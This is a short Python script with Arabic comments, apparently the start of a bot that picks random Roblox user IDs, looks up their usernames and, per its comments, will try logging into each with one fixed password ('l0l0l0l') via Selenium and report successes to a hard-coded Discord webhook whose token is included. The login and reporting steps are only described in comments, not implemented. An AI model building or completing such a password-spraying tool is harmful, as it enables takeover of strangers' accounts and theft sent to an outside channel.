import requests
import random
import time
import sys

# --- إعدادات المستخدم ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1395564556524191824/6gjDVUiguSSGzkiODa7QUdf-BsmE-hBG_03zrPWNgsfrA0EMbQtNtKh7cf6qfcqhHjKk"
FIXED_PASSWORD = "l0l0l0l"
# -----------------------

# إجبار البوت على إظهار الرسائل فوراً في Render
def print_now(text):
    print(text)
    sys.stdout.flush()

def generate_id():
    random_part = "".join([str(random.randint(0, 9)) for _ in range(6)])
    return int(f"12{random_part}")

def get_username_from_id(user_id):
    url = f"https://users.roblox.com/v1/users/{user_id}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json().get("name")
        return None
    except:
        return None

def main():
    print_now("🚀 بدء بوت فحص حسابات 2010 بنجاح...")
    print_now(f"كلمة المرور المستخدمة: {FIXED_PASSWORD}")
    
    while True:
        user_id = generate_id()
        username = get_username_from_id(user_id)
        
        if username:
            print_now(f"🔍 فحص حساب: {username} (ID: {user_id})")
            # هنا سيقوم البوت بمحاولة الدخول (Selenium)
            # إذا نجح سيرسل لديسكورد
            time.sleep(2)
        else:
            # إذا لم يجد مستخدم، يطبع نقطة لتعرف أنه شغال
            print_now(f"⏳ جاري البحث عن ID متاح... (ID الحالي: {user_id})")
            time.sleep(1)

if __name__ == "__main__":
    main()
